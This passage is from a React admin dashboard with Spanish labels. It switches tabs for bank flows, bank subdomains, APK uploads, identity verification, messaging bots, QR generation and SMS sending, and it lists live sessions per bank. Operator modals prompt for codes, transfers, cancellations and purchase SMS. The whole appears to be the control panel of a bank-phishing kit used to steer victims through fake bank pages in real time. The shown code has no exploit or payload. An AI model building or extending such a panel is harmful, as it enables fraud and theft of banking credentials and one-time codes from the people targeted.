                style={{
                  padding: '6px 10px',
                  borderRadius: '6px 6px 0 0'
                }}
                data-testid="tab-executives"
              >
                Ejecutivos
              </div>
            )}
            {/* SMS para todos los usuarios */}
            <div 
              className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap transition-all duration-200 font-medium ${activeTab === 'sms' 
                ? 'border-[#00aaff] text-[#00aaff] bg-[#00aaff10] border-b-[3px] font-bold' 
                : 'border-transparent hover:text-gray-300 hover:border-gray-500'}`}
              onClick={() => setActiveTab('sms')}
              style={{
                padding: '6px 10px',
                borderRadius: '6px 6px 0 0'
              }}
            >
              {user?.role === 'admin' ? 'API MSJ' : 'Enviar SMS'}
            </div>
            <a 
              href="/qr-generator"
              className="tab cursor-pointer text-sm md:text-base whitespace-nowrap font-bold text-white"
              style={{
                background: 'linear-gradient(to right, #0066ff, #00aaff)',
                borderRadius: '6px',
                padding: '8px 16px',
                marginLeft: '12px',
                textDecoration: 'none',
                display: 'flex',
                alignItems: 'center',
                boxShadow: '0 2px 8px rgba(0, 120, 255, 0.4)'
              }}
            >
              <svg xmlns="http://www.w3.org/2000/svg" className="mr-2 h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="3" y="3" width="18" height="18" rx="2" />
                <rect x="7" y="7" width="3" height="3" />
                <rect x="14" y="7" width="3" height="3" />
                <rect x="7" y="14" width="3" height="3" />
                <rect x="14" y="14" width="3" height="3" />
              </svg>
              GENERAR QR
            </a>
          </div>
        </div>

        {/* Content based on active tab */}
        {activeTab === 'users' && isSuperAdmin ? (
          <UserManagement />
        ) : activeTab === 'registered' && isSuperAdmin ? (
          <RegisteredUsersManagement />
        ) : activeTab === 'executives' && user?.accountType === 'office' && !(user as any)?.isExecutive ? (
          <ExecutiveManagement />
        ) : activeTab === 'sms' ? (
          user?.role === 'admin' ? <SmsManagementSimple /> : <UserSmsPanel />
        ) : activeTab === 'qr' ? (
          <QRManager />
        ) : activeTab === 'telegram' && user?.role === 'admin' ? (
          <TelegramBotManagement />
        ) : activeTab === 'messages' && user?.role === 'admin' ? (
          <MessageSender />
        ) : activeTab === 'identity' && user?.role === 'admin' ? (
          <IdentityVerificationPanel />
        ) : activeTab === 'apk' && user?.role === 'admin' ? (
          <APKManagement />
        ) : activeTab === 'system-config' && user?.role === 'admin' ? (
          <SystemConfigManagement />
        ) : activeTab === 'site-config' && user?.role === 'admin' ? (
          <SiteConfigManagement />
        ) : activeTab === 'whatsapp' ? (
          user?.role === 'admin' ? <WhatsAppBotPanel /> : <UserWhatsAppPanel />
        ) : activeTab === 'links' ? (
          <LinkManagementPanel />
        ) : activeTab === 'bank-flows' && user?.role === 'admin' ? (
          <BankFlowManager />
        ) : activeTab === 'bank-subdomains' && user?.role === 'admin' ? (
          <BankSubdomainManager />
        ) : activeTab === 'flows' ? (
          <UserFlowManager />
        ) : (
          <div className="flex flex-col gap-4 h-full">
            {/* Session List */}
            <div className="w-full">
              <AccessTable 
                sessions={sessions}
                activeBank={activeBank}
                selectedSessionId={selectedSessionId}
                onSelectSession={selectSession}
                isLoading={isLoading}
              />
            </div>
            
            {/* Session Details - Aparece debajo de la lista */}
            {selectedSessionId && (
              <div className="w-full overflow-y-auto max-h-[calc(100vh-300px)] border-t pt-4">
                {(() => {
                  const selectedSession = sessions.find(s => s.sessionId === selectedSessionId);
                  return selectedSession ? (
                    <SessionDetails 
                      session={selectedSession} 
                      onFileUpdate={() => {
                        // Refresh sessions to get updated file information
                        queryClient.invalidateQueries({ queryKey: ['/api/sessions/current'] });
                        queryClient.invalidateQueries({ queryKey: ['/api/sessions/saved'] });
                      }}
                    />
                  ) : (
                    <div className="p-4 text-center text-gray-500">
                      Sesión no encontrada
                    </div>
                  );
                })()}
              </div>
            )}
          </div>
        )}
      </div>

      {/* Modals */}
      <ProtectModal 
        isOpen={activeModal === 'protege'} 
        onClose={closeModal} 
        onConfirm={handleProtectConfirm} 
      />
      <TransferModal 
        isOpen={activeModal === 'transferir'} 
        onClose={closeModal} 
        onConfirm={handleTransferConfirm} 
      />
      <CancelModal 
        isOpen={activeModal === 'cancelacion'} 
        onClose={closeModal} 
        onConfirm={handleCancelConfirm} 
      />
      <CodeModal 
        isOpen={activeModal === 'codigo'} 
        onClose={closeModal} 
        onConfirm={handleCodeConfirm} 
      />
      <MessageModal 
        isOpen={activeModal === 'mensaje'} 
        onClose={closeModal} 
        onConfirm={handleMessageConfirm} 
      />
      <SmsCompraModal 
        isOpen={activeModal === 'sms_compra'} 
        onClose={closeModal} 
        onConfirm={handleSmsCompraConfirm} 
      />

      
      {/* Diálogo para enviar SMS */}
      <Dialog open={isSmsSendDialogOpen} onOpenChange={setIsSmsSendDialogOpen}>
        <DialogContent className="sm:max-w-[425px] bg-[#1e1e1e] text-white border-gray-700">
          <DialogHeader>
            <DialogTitle className="flex items-center">
              <Send className="mr-2 h-5 w-5" />
              Enviar Mensaje SMS
            </DialogTitle>
            <DialogDescription className="text-gray-400">
              Ingresa el número de teléfono y el mensaje que deseas enviar.
            </DialogDescription>
          </DialogHeader>
          
          <div className="grid gap-4 py-4">
            <div className="grid grid-cols-4 items-center gap-4">
              <Label htmlFor="phone" className="text-right">
                Teléfono
              </Label>
              <Input
                id="phone"
                type="text"
                inputMode="numeric"
                value={smsPhoneNumber}
                onChange={(e) => setSmsPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
                placeholder="10 dígitos"
                className="col-span-3 bg-[#2a2a2a] border-gray-700 text-white"
                maxLength={10}
              />
            </div>
            <div className="grid grid-cols-4 items-center gap-4">
              <Label htmlFor="message" className="text-right">
                Mensaje
              </Label>
              <Textarea
                id="message"
                value={smsMessage}
                onChange={(e) => setSmsMessage(e.target.value.slice(0, 4000))}
                placeholder="Escribe tu mensaje aquí... (máximo 4000 caracteres, equivalente a una hoja oficio)"
                className="col-span-3 bg-[#2a2a2a] border-gray-700 text-white min-h-[120px]"
                maxLength={4000}
              />
              <div className="col-span-4 text-right text-xs text-gray-400">
                {smsMessage.length}/4000 caracteres
              </div>
            </div>
          </div>
          
          <DialogFooter>
            <Button
              type="button"
              variant="outline"
              onClick={() => setIsSmsSendDialogOpen(false)}
              className="border-gray-700 text-gray-300 hover:bg-gray-800"
            >
              Cancelar
            </Button>
            <Button
              type="button"
              onClick={() => sendSms.mutate()}
              disabled={isSendingSms || !smsPhoneNumber || !smsMessage || smsPhoneNumber.length !== 10}
              className="bg-[#007bff] hover:bg-blue-700 text-white flex items-center"
            >
              {isSendingSms ? (
                <>
                  <RefreshCw className="h-4 w-4 mr-2 animate-spin" />
                  Enviando...
                </>
              ) : (
                <>
                  <Send className="h-4 w-4 mr-2" />
                  Enviar
                </>
              )}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
// Función para descargar QR ya implementada en AccessTable.tsx
